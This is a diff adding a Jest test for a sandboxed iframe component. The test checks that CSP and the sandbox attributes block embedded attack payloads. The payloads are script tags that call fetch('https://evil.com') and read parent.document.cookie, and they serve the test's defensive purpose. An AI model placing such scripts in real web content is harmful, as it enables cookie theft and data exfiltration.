@@ -104,4 +104,34 @@ describe('SandboxSecurity Tests (Evaluator Focus Area: Artifact Security)', () =
     // Because allow-same-origin is omitted, the document is in an opaque origin
     expect(sandboxAttr).not.toContain('allow-same-origin');
   });
+
+  it('strictly blocks <script>fetch(\'https://evil.com\')</script> and <script>parent.document.cookie</script>', () => {
+    const attackPayload = `
+      <!DOCTYPE html>
+      <html>
+      <head><title>Exploit Probe</title></head>
+      <body>
+        <script>fetch('https://evil.com')</script>
+        <script>parent.document.cookie</script>
+        <p>Security verification target</p>
+      </body>
+      </html>
+    `;
+
+    render(<SandboxedIframe content={attackPayload} title="Exploit Verification Test" />);
+
+    const iframe = screen.getByTitle('Exploit Verification Test') as HTMLIFrameElement;
+    const sandboxAttr = iframe.getAttribute('sandbox') || '';
+    const srcDoc = iframe.getAttribute('srcdoc') || '';
+
+    // 1. fetch('https://evil.com') is blocked at the network level by CSP default-src 'none'
+    expect(srcDoc).toContain("default-src 'none'");
+    expect(srcDoc).toContain('http-equiv="Content-Security-Policy"');
+
+    // 2. parent.document.cookie is blocked by the absence of allow-same-origin
+    // Without allow-same-origin, the iframe runs in an opaque origin ('null')
+    // Accessing parent.document or parent cookies throws DOMException / cross-origin error
+    expect(sandboxAttr).not.toContain('allow-same-origin');
+    expect(sandboxAttr).toContain('allow-scripts');
+  });
 });
